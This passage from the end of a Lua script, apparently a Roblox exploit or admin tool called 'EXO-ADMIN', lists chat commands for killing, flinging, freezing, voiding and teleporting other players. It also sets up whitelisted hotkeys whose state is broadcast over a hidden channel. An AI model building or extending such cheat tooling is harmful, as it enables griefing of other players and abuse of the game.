        print("  !kill [t] !damage [t] [n] !heal [t] !freeze [t] !unfreeze [t] !fling [t]")
        print("  !jump [t] !spin [t] [spd] !speed [t] [x] !slow [t] [x] !jumppower [t] [n]")
        print("  !hipheight [t] [n] !freezevel [t] !shoot [t] !rapid [t] !equip [t] [tool] !unequip [t]")
        print("  !ff [t] !unff [t] !ragdoll [t] !unragdoll [t] !skydive [t] !noclip [t] !hat [t] !gravity [n]")
        print("  !void [t] !unvoid [t] !return [t]")
        print("  !goto [t] !tp [t] !warp [t] !teleport [t]")
        print("  !bring [t] !bringall !push [t] !pull [t]")
        print("  !notify [t] [msg] !hint [t] [msg]")
        print("[EXO] KEYBINDS: F7=ExpTags F12=RoleTags")
        print("[EXO] =======================================")
    end)

    LP.Chatted:Connect(function(message)
        local cmd, args = parseCommand(message)
        if cmd and CommandHandlers[cmd] then
            local ok, err = pcall(CommandHandlers[cmd], LP, args or {})
            if not ok then warn("[EXO] '" .. cmd .. "' failed: " .. tostring(err)) end
        end
    end)

    -- F7 / F12 override the base script's toggles with our new system
    UserInputService.InputBegan:Connect(function(input, processed)
        if processed then return end
        if input.KeyCode == Enum.KeyCode.F7 then
            if not isWhitelistedName(LP.Name) then warn("[EXO] F7 requires whitelist"); return end
            ExploiterTagsEnabled = not ExploiterTagsEnabled
            refreshAllTags()
            sendHidden(BCAST_PREFIX .. "exptags|" .. (ExploiterTagsEnabled and "on" or "off") .. "|")
            print("[EXO] F7 → Exploiter Tags: " .. (ExploiterTagsEnabled and "ON" or "OFF"))
            return
        end
        if input.KeyCode == Enum.KeyCode.F12 then
            if not isWhitelistedName(LP.Name) then warn("[EXO] F12 requires whitelist"); return end
            OwnerTagsEnabled = not OwnerTagsEnabled
            refreshAllTags()
            sendHidden(BCAST_PREFIX .. "ownertags|" .. (OwnerTagsEnabled and "on" or "off") .. "|")
            print("[EXO] F12 → Role Tags: " .. (OwnerTagsEnabled and "ON" or "OFF"))
            return
        end
    end)

    print("[EXO-ADMIN] loaded — type !cmds")
end
